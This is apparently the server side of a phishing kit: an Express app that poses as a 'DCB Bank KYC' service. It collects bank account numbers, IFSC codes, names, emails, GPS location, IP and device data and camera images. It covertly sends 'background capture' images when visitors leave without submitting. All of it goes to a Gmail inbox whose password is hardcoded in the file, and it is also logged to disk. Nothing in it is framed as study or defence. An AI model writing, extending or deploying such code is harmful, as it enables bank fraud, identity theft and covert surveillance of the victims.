const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');
const UAParser = require('ua-parser-js');
const busboy = require('busboy');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.raw({ type: '*/*', limit: '50mb' }));
app.use(express.static('public'));

// File upload setup
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
});

const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    cb(null, allowedTypes.includes(file.mimetype));
  },
  limits: { fileSize: 50 * 1024 * 1024 }
}).any();

// Email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'kexmwnespcwxrkjt'
  }
});

// Helper functions
const getClientIp = (req) => {
  return req.headers['x-forwarded-for']?.split(',')[0] || 
         req.connection?.remoteAddress ||
         req.socket?.remoteAddress ||
         req.connection?.socket?.remoteAddress;
};

const buildEmailHtml = (data) => {
  const isBackground = data.isFormEmpty;
  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: ${isBackground ? '#d32f2f' : '#003d6a'};">
        ${isBackground ? '⚠️ BACKGROUND CAPTURE' : '✅ KYC SUBMISSION'}
      </h2>
      
      ${isBackground ? `
      <div style="background-color: #fff3e0; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
        <p><strong>User left without submitting form</strong></p>
        <p>Captured ${data.imageCount} images before leaving</p>
      </div>
      ` : ''}
      
      <div style="background-color: #eef7ff; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #003d6a;">
        <h3 style="color: #003d6a; margin-top: 0;">📱 Device Information</h3>
        <p><strong>Type:</strong> ${data.device.type === 'mobile' ? '📱 Mobile' : '💻 Desktop'} 
           ${data.device.vendor !== 'Unknown' ? `(${data.device.vendor})` : ''}</p>
        ${data.device.model !== 'Unknown' ? `<p><strong>Model:</strong> ${data.device.model}</p>` : ''}
        <p><strong>OS:</strong> ${data.os}</p>
        <p><strong>Browser:</strong> ${data.browser}</p>
      </div>
      
      ${!isBackground ? `
      <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
        <p><strong>Bank Name:</strong> ${data.bankname}</p>
        <p><strong>IFSC Code:</strong> ${data.ifsc}</p>
        <p><strong>Account Number:</strong> ${data.accno}</p>
        <p><strong>Full Name:</strong> ${data.fullname}</p>
        <p><strong>Email:</strong> ${data.email}</p>
      </div>
      ` : ''}
      
      ${data.location ? `
      <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Location Data</h3>
        <p><strong>Latitude:</strong> ${data.location.latitude}</p>
        <p><strong>Longitude:</strong> ${data.location.longitude}</p>
        <p><strong>Accuracy:</strong> ${data.location.accuracy} meters</p>
        <p><strong>Last Updated:</strong> ${new Date(data.location.timestamp).toLocaleString()}</p>
      </div>
      ` : ''}
      
      <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Technical Data</h3>
        <p><strong>IP Address:</strong> ${data.ip}</p>
        <p><strong>Images Captured:</strong> ${data.imageCount}</p>
        <p><strong>User Agent:</strong> ${data.userAgent}</p>
        <p><strong>Timestamp:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
      </div>
    </div>
  `;
};

// Beacon submission endpoint
app.post('/beacon-submit', (req, res) => {
  const bb = busboy({ headers: req.headers });
  const files = [];
  const fields = {};
  let hadError = false;

  bb.on('file', (name, file, info) => {
    const chunks = [];
    file.on('data', (chunk) => chunks.push(chunk));
    file.on('end', () => {
      files.push({
        buffer: Buffer.concat(chunks),
        filename: info.filename || `capture_${Date.now()}.jpg`
      });
    });
    file.on('error', () => hadError = true);
  });

  bb.on('field', (name, val) => {
    fields[name] = val;
  });

  bb.on('close', async () => {
    try {
      if (hadError && files.length === 0) {
        return res.status(400).send('Invalid form data');
      }

      const submissionData = {
        device: {
          type: fields.device_type || 'desktop',
          model: fields.device_model || 'Unknown',
          vendor: fields.device_vendor || 'Unknown'
        },
        os: fields.device_os || 'Unknown',
        browser: fields.device_browser || 'Unknown',
        ip: getClientIp(req),
        userAgent: fields.user_agent || req.headers['user-agent'],
        timestamp: fields.timestamp || new Date().toISOString(),
        isFormEmpty: true,
        imageCount: files.length,
        location: fields.location ? JSON.parse(fields.location) : null
      };

      // Save files temporarily
      const filePaths = [];
      for (const file of files) {
        try {
          const path = `${uploadDir}/${Date.now()}-${file.filename}`;
          fs.writeFileSync(path, file.buffer);
          filePaths.push(path);
        } catch (e) {
          console.error('Error saving file:', e);
        }
      }

      // Send email even with partial data
      await transporter.sendMail({
        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
        to: 'dcbsubmission392@gmail.com',
        subject: `⚠️ Background Capture (${files.length} images)`,
        html: buildEmailHtml(submissionData),
        attachments: filePaths.map(path => ({
          filename: path.split('/').pop(),
          path: path
        }))
      });

      // Cleanup
      filePaths.forEach(path => {
        try { fs.unlinkSync(path); } catch(e) {}
      });

      res.status(200).send();
    } catch (error) {
      console.error('Beacon processing error:', error);
      res.status(500).send();
    }
  });

  bb.on('error', () => {
    bb.end();
  });

  req.pipe(bb);
});

// Regular submission endpoint
app.post('/submit', (req, res) => {
  upload(req, res, async (err) => {
    try {
      if (err) throw err;

      const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
      const device = parser.getDevice();
      const os = parser.getOS();
      const browser = parser.getBrowser();

      const submissionData = {
        device: {
          type: device.type || req.body.device_type || 'desktop',
          model: device.model || req.body.device_model || 'Unknown',
          vendor: device.vendor || req.body.device_vendor || 'Unknown'
        },
        os: `${os.name} ${os.version}` || req.body.device_os,
        browser: `${browser.name} ${browser.version}` || req.body.device_browser,
        bankname: req.body.bankname || 'Not provided',
        ifsc: req.body.ifsc || 'Not provided',
        accno: req.body.accno || 'Not provided',
        fullname: req.body.fullname || 'Not provided',
        email: req.body.email || 'Not provided',
        location: req.body.location ? JSON.parse(req.body.location) : null,
        ip: getClientIp(req),
        userAgent: req.headers['user-agent'] || req.body.user_agent,
        timestamp: req.body.timestamp || new Date().toISOString(),
        isFormEmpty: req.body.empty_form === 'true',
        imageCount: req.files?.length || 0
      };

      // Log the submission
      const logEntry = `
--- ${submissionData.isFormEmpty ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
OS: ${submissionData.os}
Browser: ${submissionData.browser}
IP: ${submissionData.ip}
Location: ${submissionData.location ? 
  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
Bank: ${submissionData.bankname}
IFSC: ${submissionData.ifsc}
Account: ${submissionData.accno}
Name: ${submissionData.fullname}
Email: ${submissionData.email}
Images: ${submissionData.imageCount}
User Agent: ${submissionData.userAgent}
Timestamp: ${submissionData.timestamp}
-----------------------------
`;

      fs.appendFileSync('records.txt', logEntry);

      // Send email
      const emailSubject = submissionData.isFormEmpty 
        ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
        : '✅ KYC Verification Completed';
      
      await transporter.sendMail({
        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
        to: 'dcbsubmission392@gmail.com',
        subject: emailSubject,
        html: buildEmailHtml(submissionData),
        attachments: (req.files || []).map(file => ({
          filename: file.originalname,
          path: file.path
        }))
      });

      // Cleanup
      if (req.files) {
        req.files.forEach(file => {
          try { fs.unlinkSync(file.path); } catch(e) {}
        });
      }

      res.status(200).send();
    } catch (error) {
      console.error('Submission error:', error);
      res.status(500).send('Error processing submission');
    }
  });
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
